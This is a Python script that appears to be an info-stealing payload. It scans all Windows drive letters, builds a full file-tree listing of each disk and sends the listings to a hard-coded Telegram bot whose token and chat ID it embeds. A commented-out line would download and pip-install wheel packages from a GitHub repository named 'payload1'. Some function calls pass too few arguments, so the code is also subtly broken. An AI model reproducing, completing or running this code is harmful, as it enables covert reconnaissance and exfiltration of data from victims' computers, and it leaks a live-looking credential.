#don't delete
import requests
import subprocess
import os
import tempfile
import importlib.util
import string

chat_id = "-4102145810"
token = "6653447632:AAEHVkyZH-TFa9141etCM1wmPyJ9rCXuASA"

def is_python_installed():
    try:
        subprocess.check_output(['python', '--version'])
        return True
    except subprocess.CalledProcessError:
        return False
    except FileNotFoundError:
        try:
            subprocess.check_output(['python3', '--version'])
            return True
        except subprocess.CalledProcessError:
            return False
        except FileNotFoundError:
            return False

def is_package_installed(package_name):
    package_spec = importlib.util.find_spec(package_name)
    return package_spec is not None

def get_package_name_from_whl(whl_filename):
    return whl_filename.split('-')[0]

def download_and_install_whls(repo_url):
    response = requests.get(repo_url)
    
    if response.status_code == 200:
        files = response.json()
        for file in files:
            if file['name'].endswith('.whl'):
                package_name = get_package_name_from_whl(file['name'])
                if not is_package_installed(package_name):
                    url = file['download_url']
                    download_and_install_whl(url, file['name'])
                else:
                    print(f"Package {package_name} is already installed.")
    else:
        print(f"Failed to retrieve the list of files. Status code: {response.status_code}")

def download_and_install_whl(url, filename):
    if not is_python_installed():
        print("Python is not installed. Aborting")
        return
    try:
        with tempfile.NamedTemporaryFile(delete=False, suffix='.whl') as tmp_file:
            response = requests.get(url)
            tmp_file.write(response.content)
            tmp_file.close()
            valid_wheel_filename = os.path.join(tempfile.gettempdir(), filename)
            if os.path.exists(valid_wheel_filename):
                os.remove(valid_wheel_filename)
            os.rename(tmp_file.name, valid_wheel_filename)
            subprocess.check_call(['pip', 'install', valid_wheel_filename])
            os.remove(valid_wheel_filename)
    except Exception as e:
        print(f"Error downloading or installing whl: {e}")

def send_message(chat_id, token, message):
    r = requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text={message}")

def send_file(chat_id, token, filepath):
    data = {'chat_id' : chat_id}
    with open(filepath, 'rb') as file:
        files = {
            'document': file.read()
        }
    r = requests.post(f"https://api.telegram.org/bot{token}/sendDocument", data=data, files=files)

def is_junction(path):
    if os.path.isdir(path) and not os.path.exists(path):
        return True
    return False

def tree(directory, file, prefix=''):
    try:
        files = os.listdir(directory)
    except PermissionError:
        return

    files.sort()
    contents = [(f, os.path.isdir(os.path.join(directory, f))) for f in files]

    for index, (name, is_dir) in enumerate(contents):
        path = os.path.join(directory, name)
        
        if is_junction(path):
            continue
        
        if is_dir:
            connector = '├── ' if index < len(contents) - 1 else '└── '
            file.write(prefix + connector + name + '/\n')
            extension = '│   ' if index < len(contents) - 1 else '    '
            tree(path, file, prefix + extension)
        else:
            connector = '├── ' if index < len(contents) - 1 else '└── '
            file.write(prefix + connector + name + '\n')

def process_path(chat_id, token, disk):
    with tempfile.NamedTemporaryFile(delete=False, mode='w', encoding='utf-8') as temp_file:
        tree(disk, temp_file)
        temp_file_path = temp_file.name
    print(f"{disk} : {temp_file_path}")
    send_message(disk)
    send_file(temp_file_path)

def scan_disks(parameter):
    maj_letters = list(string.ascii_uppercase)
    disks = []
    for maj_letter in maj_letters:
        letterpath = f"{maj_letter}:\\"
        if os.path.isdir(letterpath):
            if parameter == 1:
                disks.append(letterpath)
            elif parameter == 2:
                if not (os.path.isdir(letterpath + "Windows\\system32") or os.path.isdir("/usr/bin")):
                    disks.append(letterpath)
    return disks

#Install modules :
#download_and_install_whls('https://api.github.com/repos/slayy2357/payload1/contents/modules')

#Scan all available disks function
#Param 1 : for all disks
#Param 2 : for no OS disks
disks = scan_disks(1)

for disks in disks:
    process_path(chat_id, token, disks)